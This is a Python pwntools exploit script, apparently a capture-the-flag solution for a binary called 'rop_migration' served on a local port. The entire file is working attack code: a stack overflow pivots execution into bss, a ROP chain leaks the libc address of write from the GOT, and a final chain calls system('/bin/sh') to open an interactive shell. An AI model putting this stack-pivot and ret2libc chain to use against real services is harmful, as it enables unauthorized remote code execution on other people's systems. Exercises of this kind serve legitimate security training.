from pwn import *
context.arch = 'amd64'

elf = ELF('../distribute/share/rop_migration')

# p = elf.process()
p = remote('0.0.0.0', 30008)

bss = 0x0000000000404000 + 0x800
bss2 = bss + 0x400
pop_rdi = 0x00000000004012b3
pop_rsi_r15 = 0x00000000004012b1
leave_ret = 0x0000000000401242
ret = 0x000000000040101a

p.recvline()
payload = b'a' * 0x20
payload += flat([bss, pop_rsi_r15, bss, 0, elf.plt['read'], leave_ret])
p.send(payload)

payload2 = flat([bss2, pop_rdi, 0, pop_rsi_r15, bss2, 0, elf.plt['read'], leave_ret])
p.send(payload2)

payload3 = flat([bss, pop_rdi, 1, pop_rsi_r15, elf.got['write'], 0, elf.plt['write'], leave_ret])
raw_input()
p.send(payload3)
p.recv()
write_addr = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = write_addr - 0x1111d0
info(f'libc_base: {hex(libc_base)}')

system = libc_base + 0x55410
sh = libc_base + 0x1b75aa
payload4 = flat([bss, pop_rdi, sh, ret, system])
p.sendline(payload4)

p.interactive()
